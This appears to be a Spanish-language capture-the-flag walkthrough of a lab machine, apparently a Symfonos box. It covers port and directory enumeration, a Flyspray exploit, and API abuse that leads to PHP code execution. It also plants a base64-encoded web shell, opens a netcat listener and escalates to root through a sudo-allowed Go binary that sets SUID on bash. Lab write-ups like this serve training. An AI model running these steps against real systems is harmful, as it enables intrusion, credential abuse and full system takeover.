___
tags: #machine #api #nmap #whatweb #gobuster #searchsploit #github #curl #sudoers #abusing_privilege  #linux 
___
## Enumeración
### nmap
```shell
# extraemos todos los puertos abiertos
nmap -p- --open --min-rate 5000 -Pn -n -vvv 192.168.1.11 -oG all-ports

# Puertos encontrado:
# 22,80,3000,3306, 5000

# extraemos información de los servicios y corremos algunos scripts para ellos
nmap -p[puertos] -sCV 192.168.1.11 -oN targeted

# -> nos indica que es un CentOS
```
### whatweb
```shell
whatweb 192.168.1.11

# info relevante
# php 5.6.40
```
### Explorando
#### API : (192.168.1.11:3000)
```txt
# Gitea version 1.11.4
```

#### Gobuster
```shell
gobuster dir -u http://192.168.1.11 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
# founded
# /posts : 301
# /flyspray -> es un csm
```

#### Searchsploit
```shell
# buscamos un exploit para el ssh
searchsploit ssh user enumeration
# 43939.py -> achilles, root valid user

# buscamos un exploit para php 
searchsploit php 5.6.40

# buscamos un exploit para gitea
searchsploit gitea 1.11.4

# buscamos un exploit para flyspray
searchsploit flyspray 1
# php/webapps/41918.txt

# -> ejecuto el ataque gracias a este exploit
# inyectamos el payload y servimos el formulario del exploit
# nos dara un usuario de administrador en flyspray
```

### Rutas
- http://192.168.1.11/posts
- http://192.168.1.11/includes
	- db.php -> no se ve el contenido
	- dbconfig.php -> no se ve el contenido
- http://192.168.1.11/flyspray
	- http://192.168.1.11/flyspray 
## Explotación
### Explotamos el php/webapps/41918.txt
Obtenemos un usuario `hacker:12345678` como admin en el cms flyspray, con el vemos información privilegiada de otro reporte y obtenemos las credenciales de `achilles:h2sBr9gryBunKdF9`
### symfonos -> achilles
Obtenemos visibilidad del archivo `dbconfig.php` 
```txt
    <?php
    $GLOBALS['dbConfig'] = array(
        'host' => '127.0.0.1:3306',
        'user' => 'root',
        'pass' => 'password',
        'db' => 'api'
    );
```

### Curl
```shell

# nos autenticamos en la API por el puerto 5000
curl -s -X POST "http://192.168.1.11:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}'| jq

# {
#  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjI5ODUyMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.1d_oQTfaMXoXiZcCMBeBRVjk_xwpc6x1NQg3xrqy0-A",
#  "user": {
#   "display_name": "achilles",
#   "id": 1,
#   "username": "achilles"
#  }
# }

# logramos actualizar un posts para ver que tenemos ejecución remota de comandos (RCE)
curl -s -X PATCH "http://192.168.1.11:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjI5ODUyMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.1d_oQTfaMXoXiZcCMBeBRVjk_xwpc6x1NQg3xrqy0-A' -d $'{"text":"system(\'whoami\')"}' | jq
```

### RCE
```shell
# revisamos que podamos crear un archivo con file_put_contents()

curl -s -X PATCH "http://192.168.1.11:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjI5ODUyMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.1d_oQTfaMXoXiZcCMBeBRVjk_xwpc6x1NQg3xrqy0-A' -d $'{"text":"file_put_contents(\'prueba.txt\', \'Wua\')"}' | jq

## -> efectivamente nos permite crear archivos


# Creamos un archivo cmd.php con capacidad de recibir comandos por parametro cmd, codificado en base64
curl -s -X PATCH "http://192.168.1.11:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjI5ODUyMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.1d_oQTfaMXoXiZcCMBeBRVjk_xwpc6x1NQg3xrqy0-A' -d $'{"text":"file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}' | jq
```

Nos ponemos en escucha con netcat
```shell
nc -nvlp 443
```

#### Tratamiento de la tty
```shell
script /dev/null -c bash
^z
stty raw -echo; fg
reset xterm

# exportamos variables
export TERM=xterm
export SHELL=bash

# ajustamos tamaño
stty rows 37 columns 183
```
## Escalar privilegios
### Pivoting
```shell
#aprovechamos las credenciales de achilles y accedemos a el
su achilles
```

### Revisamos permisos a nivel de sudoers
```shell
sudo -l
```

Descubrimos  que tenemos capacidad de ejecutar `/usr/bin/go` de forma privilegiada sin contraseña, creamos un archivo Go en `/tmp/` con las siguientes instrucciones

```go
package main

import(
	"log"
	"os/exec"
)

func main(){
	cmd:= exec.Command("chmod","u+s","/bin/bash")
	
	err:= cmd.Run()
	
	if err != nil {
		log.Fatal(err)
	}
}
```

y al ejecutar `sudo /usr/bin/go pwned.go` nos daria permisos de ejecutar bash como root.
```shell
#congrats ;)
bash -p
```

